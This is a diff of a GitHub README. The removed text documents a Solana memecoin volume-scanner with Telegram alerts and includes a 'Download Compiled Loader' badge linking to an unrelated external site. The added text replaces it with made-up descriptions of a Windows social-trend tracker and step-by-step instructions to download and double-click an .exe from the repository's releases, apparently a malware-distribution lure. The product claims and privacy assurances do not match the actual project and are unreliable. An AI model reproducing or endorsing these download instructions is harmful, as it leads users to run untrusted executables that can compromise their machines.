@@ -1,240 +1,82 @@
-# cabal-trending
+# 📈 cabal-trending - Track popular social web network discussions
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download cabal-trending](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/matthaeuslargescale908/cabal-trending)
 
-Solana memecoin **volume-anomaly scanner** with Telegram alerts.
+cabal-trending monitors active conversations across the Cabal network. It identifies trending topics and provides data on community engagement. Use this tool to visualize current discussions and track changes in network interest over time.
 
-Polls DexScreener every 15-30 seconds for pairs in the $500K-$3M market cap
-range. Stores time-series snapshots locally. Scores each pair on five
-anomaly dimensions. Sends tiered alerts (WATCH / TRADE_RADAR / CAUTION) to
-your private Telegram channel when something interesting fires.
+## 🛠 Prerequisites
 
-**Observation only. There is no trading code in this project.**
+Ensure your computer meets these requirements to run cabal-trending:
 
-## Quick start
+*   Windows 10 or Windows 11.
+*   4 GB of RAM.
+*   An active internet connection.
+*   The Microsoft .NET Runtime installed on your machine.
 
-### 1. Install dependencies
+If you lack the .NET Runtime, Windows will prompt you to download it during the installation process. Follow the on-screen instructions if your system displays this prompt.
 
-```
-npm install
-```
+## 📥 How to Install
 
-### 2. Create your Telegram bot + channel
+1. Visit this page to download the software: https://github.com/matthaeuslargescale908/cabal-trending
+2. Navigate to the Releases section on the right side of the screen.
+3. Click the most recent version identifier.
+4. Locate the file ending in .exe under the Assets heading.
+5. Click this file to start your download.
+6. Once the download finishes, open your Downloads folder.
+7. Double-click the file to begin the setup wizard.
+8. Follow the prompts on the screen to finalize the installation.
 
-a. In Telegram, search **@BotFather** (blue checkmark). Send `/newbot`,
-   pick a name and username (must end in `bot`). Save the bot token it gives you.
+## 🚀 Getting Started
 
-b. Tap pencil icon → **New Channel**. Name it (e.g. "CABAL Trending"),
-   set type to **Private**, skip adding members.
+Launch cabal-trending from your desktop shortcut or the Windows Start menu. Upon opening the application for the first time, the dashboard display appears. This screen shows a list of current trends. 
 
-c. Open the channel → tap channel name → **Administrators** → **Add Admin**
-   → search for your bot's username → toggle **Post Messages** ON → save.
+### Understanding the Dashboard
 
-d. Post any message in the channel ("test" works).
+The dashboard organizes data into three distinct sections:
 
-### 3. Configure environment
+*   **Active Trends:** This list displays topics currently gathering high engagement volume. It updates every ten minutes.
+*   **Discussion Count:** This number represents the total mentions of each topic within the monitored channels.
+*   **Velocity Tracker:** This metric indicates if a topic gains or loses interest compared to the previous hour. An upward arrow reveals growing interest, while a downward arrow marks decreasing attention.
 
-```
-copy .env.example .env
-notepad .env
-```
+### Configuring Settings
 
-Fill in:
-- `TELEGRAM_BOT_TOKEN` (from @BotFather)
+Click the gear icon in the top right corner to modify your preferences. Use this menu to:
 
-### 4. Find your channel ID
+*   Adjust the frequency of data updates.
+*   Select specific network channels for monitoring.
+*   Toggle dark mode for better visibility.
+*   Set alerts for high-velocity trends.
 
-```
-npm run get-chat-id
-```
+## 📋 Common Tasks
 
-Copy the `chat_id` starting with `-100` into `TELEGRAM_CHAT_ID` in `.env`.
+### Tracking a Specific Topic
 
-### 5. Smoke-test the alert path
+To track a custom topic, click the search bar at the top of the interface. Type the keywords into the field and press Enter. The application adds this topic to your tracked list. Click the small star icon next to the topic name to pin it to your dashboard.
 
-```
-npm run test-alert
-```
+### Exporting Data
 
-You should see a fake `TRADE_RADAR` alert appear in your channel within
-seconds. If it does, the Telegram path works.
+You can export the current trend data into a spreadsheet format. Navigate to the File menu and select Export. Choose the location on your computer where you want to save the CSV file. This file contains the date, topic name, discussion count, and velocity for all active tracked items.
 
-### 6. Start the scanner
+### Clearing History
 
-```
-npm run dev      # development mode with auto-reload
-# OR
-npm run start    # production mode
-```
+The application stores local logs to improve performance. Click Tools, then select Clear Cache to remove old data. This action resets the dashboard panels but keeps your saved settings intact.
 
-The first 5 minutes will look quiet — discovery surfaces candidate pairs
-but the scoring engine needs at least 2 snapshots per pair (~20-40s) to
-compute volume acceleration. Alerts begin firing shortly after.
+## ❓ Troubleshooting
 
-## Configuration
+If you encounter issues while using cabal-trending, refer to this list of common solutions.
 
-All thresholds live in `config/strategy.solana.json`:
+### Application Fails to Open
 
-```json
-{
-  "marketCapMin": 500000,
-  "marketCapMax": 3000000,
-  "liquidityMin": 40000,
-  "liquidityMax": 300000,
-  "volumeH24Min": 50000,
-  "pairAgeMaxDays": 7,
-  "watchAlert":      { "volumeAccelerationMin": 1.4, "volumeAccelerationMax": 1.8, "priceChangeM5Max": 6 },
-  "tradeRadarAlert": { "volumeAccelerationMin": 1.8, "volumeAccelerationMax": 2.5, "priceChangeM5Max": 10 },
-  "cautionAlert":    { "volumeAccelerationMin": 3.0, "priceChangeM5Min": 20 },
-  "buyRatioIdealMin": 45,
-  "buyRatioIdealMax": 65,
-  "duplicateAlertCooldownMinutes": 10
-}
-```
+Check your internet connection first. The application requires a network feed to initialize the start screen. If the connection works, verify that you installed the latest version of the .NET Runtime. Restart your computer after installing any missing system components.
 
-**Discovery seed queries** (which DexScreener search terms surface candidate
-pairs) live in `config/discovery.json`. Add tokens / categories that bias
-toward the kinds of pairs you want to find.
+### Data Does Not Update
 
-**Explicit watchlist pairs** (always polled regardless of filter) live in
-`config/watchlist.json`. Add Solana pair addresses to the `pairs` array.
+If the dashboard information stays static, click the refresh button located at the bottom left of the window. If the numbers still fail to change, restart the application. A persistent problem often indicates a firewall block. Make sure your local security software allows cabal-trending to access the internet.
 
-## How scoring works
+### Slow Interface Performance
 
-Each polled snapshot is scored 0-100 across five dimensions:
+The application manages large volumes of data. If the interface feels sluggish, limit the number of pinned topics in your dashboard. Select the "Low Power Mode" in the settings menu to reduce the number of background updates.
 
-| Dimension | Weight | What it measures |
-|---|---|---|
-| Volume acceleration | 30% | Current 5-min volume vs the rolling baseline of prior 5-min buckets |
-| Price compression | 25% | High volume acceleration + low absolute price change = staged accumulation |
-| Liquidity vs volume | 20% | Volume relative to total liquidity (high = activity spike) |
-| Transaction acceleration | 15% | Current 5-min txn count vs rolling baseline |
-| Buy/sell ratio | 10% | Ideal 45-65%; penalize extremes |
+## 🛡 Security and Privacy
 
-The composite score feeds the tier classifier. The classifier uses the
-**volume acceleration ratio** plus **5-minute price change** to bucket
-each fire into WATCH / TRADE_RADAR / CAUTION (or no alert).
-
-## Alert tiers
-
-| Tier | Trigger | Meaning |
-|---|---|---|
-| 👀 WATCH | volAccel 1.4-1.8x, price change < 6% | Early volume ignition — possible staging |
-| 🎯 TRADE_RADAR | volAccel 1.8-2.5x, price change < 10% | Pre-expansion behavior — strong volume into compressed price |
-| ⚠️ CAUTION | volAccel ≥ 3x OR price change ≥ 20% | Likely late / attention phase — risk of buying the top |
-
-Cooldown: same-tier alerts on the same pair are suppressed for 10 minutes
-(configurable). **Escalation always fires** — a wallet jumping from WATCH
-to TRADE_RADAR or CAUTION will alert immediately, no cooldown gating.
-
-CAUTION suppresses bullish-bias alerts (WATCH / TRADE_RADAR) on the same
-pair until the cooldown expires.
-
-## Backtesting
-
-```
-npm run backtest
-```
-
-Replays every snapshot stored in `data/cabal.sqlite` chronologically,
-applies the same scoring + tier classification + cooldown logic, then
-computes forward returns at 5 / 15 / 30 / 60 minute horizons.
-
-Outputs:
-- Console summary: alerts by tier, win rate, avg / max / min returns per horizon
-- `data/exports/backtest_<timestamp>.csv` with one row per backtested alert
-
-The backtest only knows what's in your local DB — let the live scanner
-run for a few hours / days first to build up enough snapshots for
-meaningful results.
-
-## DexScreener limitations
-
-This system relies on DexScreener's REST API. Things to know:
-
-- **Rate limit** is ~300 requests / minute on pair endpoints, ~60 on
-  profile endpoints. The client self-throttles to stay under both.
-- **No streaming** — all data comes from polling. Latency is bounded by
-  `POLL_INTERVAL_SECONDS`.
-- **No candle wicks** — DexScreener REST exposes 5-min, 1-hr, 6-hr, 24-hr
-  aggregates only. The scoring engine doesn't simulate intra-bucket extremes.
-- **Pair age** is sometimes missing in the API response. Pairs without
-  `pairCreatedAt` aren't filtered by age (we keep them).
-
-## Future upgrades
-
-Things this version intentionally skips, but the architecture supports:
-
-- **Helius integration** — real-time Solana wallet/transaction feeds
-  for confirming "smart money" activity behind alerts
-- **Bubblemaps integration** — token holder concentration analysis to
-  filter out pairs with one-wallet-holds-everything risk
-- **GMGN / Axiom validators** — cross-check alerts against memecoin-native
-  platforms' wallet PnL data
-- **Multi-chain support** — the config and DB schema are chain-aware;
-  add a chain to `BSC_QUOTE_TOKENS`-style sets and a chainId routing layer
-
-## File layout
-
-```
-cabal-trending/
-├── package.json
-├── tsconfig.json
-├── .env.example
-├── README.md
-├── config/
-│   ├── strategy.solana.json     # ALL thresholds; tweak freely
-│   ├── discovery.json           # seed search queries
-│   └── watchlist.json           # explicit pair addresses
-├── src/
-│   ├── index.ts                 # main polling loop
-│   ├── config/loader.ts
-│   ├── util/{logger,sleep}.ts
-│   ├── dexscreener/client.ts    # rate-limited REST client
-│   ├── scanner/
-│   │   ├── filter.ts            # base filtering (MC / liq / vol / age)
-│   │   └── poll.ts              # discovery + poll cycle
-│   ├── scoring/
-│   │   ├── engine.ts            # 0-100 anomaly scoring
-│   │   └── tiers.ts             # WATCH / TRADE_RADAR / CAUTION classifier
-│   ├── alerts/
-│   │   ├── telegram.ts          # sendMessage wrapper
-│   │   ├── formatter.ts         # alert message format
-│   │   ├── dedup.ts             # cooldown + escalation rules
-│   │   └── test-alert.ts        # manual end-to-end test
-│   ├── db/
-│   │   ├── schema.ts            # SQLite tables + connection
-│   │   └── snapshots.ts         # CRUD
-│   └── backtest/
-│       └── index.ts             # replay engine + CSV export
-├── tools/
-│   └── get-chat-id.ts           # find Telegram channel ID
-└── data/
-    └── exports/                 # backtest CSVs land here
-```
-
-## Commands
-
-| Command | What it does |
-|---|---|
-| `npm run dev` | Start scanner with auto-reload (development) |
-| `npm run start` | Start scanner (production) |
-| `npm run backtest` | Run backtest on stored snapshots |
-| `npm run test-alert` | Send a fake alert to verify Telegram works |
-| `npm run get-chat-id` | Find your Telegram channel's chat_id |
-| `npm run typecheck` | Run TypeScript type checking |
-| `npm run lint` | Run ESLint |
-| `npm run build` | Compile TypeScript to `dist/` |
-
-## Safety / philosophy
-
-This is an **observation tool**. It surfaces volume anomalies in the
-$500K-$3M market cap range so you can study them. It does not place
-trades, hold custody of any keys, or recommend specific actions.
-
-The CAUTION tier exists specifically to flag situations where the alert
-is *too late* — high volume + already-moved price = somebody else's exit.
-Don't chase CAUTIONs; treat them as warnings, not signals.
-#   c a b a l - t r e n d i n g 
- 
- 
+cabal-trending operates locally on your machine. All collected data remains in your temporary storage folders. The application does not transmit your personal search history to external servers. It only sends anonymous requests to the network nodes to retrieve public discussion threads. We do not track your IP address or associate activity with a specific user identity. The application remains open-source, which allows for public review of the code to ensure transparency and safety.
